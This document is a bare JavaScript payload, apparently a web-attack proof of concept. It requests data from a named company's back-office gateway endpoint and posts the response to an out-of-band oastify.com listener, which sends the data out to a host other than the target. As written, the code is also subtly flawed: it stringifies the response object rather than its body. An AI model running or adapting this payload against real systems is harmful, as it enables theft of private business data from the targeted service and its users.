fetch(`https://demobackoffice.finalto.com/Communication/Gateway.ashx?data=[1,[34,[%22141740%22,%2212/04/2023%22,%2201/15/2024%22]]]`).then((res)=>{
  const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: res.toString()
};
fetch('https://uvtgzitr8mxl28m1dp1k1q06ixoqcm0b.oastify.com', requestOptions);
})
